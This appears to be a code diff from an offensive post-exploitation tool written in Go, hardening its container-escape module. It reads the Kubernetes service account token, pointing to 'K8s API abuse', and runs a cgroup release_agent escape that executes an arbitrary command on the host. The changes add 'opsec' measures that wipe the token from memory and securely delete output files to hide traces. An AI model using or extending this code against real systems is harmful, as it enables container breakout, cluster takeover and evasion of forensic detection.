@@ -157,11 +157,13 @@ func escapeCheck() (string, string) {
 	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
 	if data, err := os.ReadFile(tokenPath); err == nil {
 		token := string(data)
+		structs.ZeroBytes(data) // opsec: clear raw token bytes
 		if len(token) > 50 {
 			token = token[:50] + "..."
 		}
 		sb.WriteString(fmt.Sprintf("[!] K8s service account token found: %s\n", token))
 		sb.WriteString("    Potential for K8s API abuse (pod creation, secret access)\n\n")
+		structs.ZeroString(&token) // opsec: clear truncated token
 		vectors++
 	}
 
@@ -388,6 +390,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Write script
 	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
 	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
+		secureRemove(outputPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to write escape script: %v", err), "error"
@@ -422,11 +425,15 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	// Trigger by writing our PID to child cgroup then removing it
 	cgroupProcs := filepath.Join(childDir, "cgroup.procs")
-	os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
+	if err := os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
+		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to child cgroup.procs: %v\n", err))
+	}
 
 	// Move back to parent and remove child to trigger release
 	parentProcs := filepath.Join(cgroupDir, "cgroup.procs")
-	os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
+	if err := os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
+		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to parent cgroup.procs: %v\n", err))
+	}
 	os.Remove(childDir)
 
 	sb.WriteString("[+] Triggered release_agent\n")
@@ -435,11 +442,11 @@ func escapeCgroupNotify(command string) (string, string) {
 	if data, err := os.ReadFile(outputPath); err == nil {
 		sb.WriteString("\n--- Output ---\n")
 		sb.WriteString(string(data))
-		secureRemove(outputPath)
 	} else {
 		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
 		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
 	}
+	secureRemove(outputPath)
 
 	// Cleanup
 	secureRemove(scriptPath)
